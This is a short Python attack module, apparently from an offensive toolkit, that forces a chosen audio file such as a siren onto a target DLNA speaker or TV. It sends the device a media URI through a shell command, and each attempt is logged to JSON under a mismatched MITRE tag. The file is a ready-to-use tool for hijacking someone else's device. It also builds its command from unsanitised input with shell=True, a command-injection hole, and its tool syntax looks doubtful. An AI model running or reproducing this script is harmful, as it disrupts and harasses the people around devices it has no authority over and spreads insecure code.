# modules/attacks/dlna_stream_screamer.py

import subprocess
import os
import json
import time
from datetime import datetime
import argparse

LOG_PATH = "results/dlna_screamer_log.json"
MITRE_TTP = "T1123"

def log_screamer(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def scream(target_ip, media_path):
    try:
        full_path = os.path.abspath(media_path)
        cmd = f"gupnp-av-cp --set-uri 'http://{target_ip}/MediaRenderer/AVTransport/Control' file://{full_path}"
        subprocess.run(cmd, shell=True, timeout=10)
        log_screamer({
            "timestamp": datetime.utcnow().isoformat(),
            "target": target_ip,
            "media": media_path,
            "ttp": MITRE_TTP
        })
        return True
    except Exception:
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DLNA Stream Screamer")
    parser.add_argument("--target", required=True, help="Target speaker/TV IP")
    parser.add_argument("--media", required=True, help="Media file to stream (e.g., siren.mp3)")
    args = parser.parse_args()

    if scream(args.target, args.media):
        print("[+] Streamed to DLNA device")
    else:
        print("[!] DLNA stream failed")
